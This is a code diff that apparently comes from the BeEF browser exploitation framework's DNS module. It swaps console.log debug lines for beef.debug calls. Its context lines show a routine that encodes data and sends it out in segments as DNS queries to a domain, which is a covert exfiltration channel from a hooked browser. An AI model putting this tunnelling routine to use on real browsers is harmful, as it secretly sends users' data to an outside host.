@@ -30,9 +30,8 @@ beef.net.dns = {
 
         var encodedData = encodeURI(encode_data(data));
 
-        //TODO remove this
-        console.log(encodedData);
-        console.log("_encodedData_ length: " + encodedData.length);
+        beef.debug(encodedData);
+        beef.debug("_encodedData_ length: " + encodedData.length);
 
         // limitations to DNS according to RFC 1035:
         // o Domain names must only consist of a-z, A-Z, 0-9, hyphen (-) and fullstop (.) characters
@@ -50,8 +49,7 @@ beef.net.dns = {
         var max_domain_length = 255 - reserved_seq_length; //leave some space for sequence numbers
         var max_data_segment_length = 63; // by RFC
 
-        //TODO remove this
-        console.log("max_data_segment_length: " + max_data_segment_length);
+        beef.debug("max_data_segment_length: " + max_data_segment_length);
 
         var dom = document.createElement('b');
 
@@ -76,8 +74,7 @@ beef.net.dns = {
 
         var ident = "0xb3"; //see extensions/dns/dns.rb, useful to explicitly mark the DNS request as a tunnel request
 
-        //TODO remove this
-        console.log(segments.length);
+        beef.debug(segments.length);
 
         for (var seq=1; seq<=segments.length; seq++) {
             sendQuery(ident + msgId + "." + seq + "." + segments.length + "." + segments[seq-1] + "." + domain);
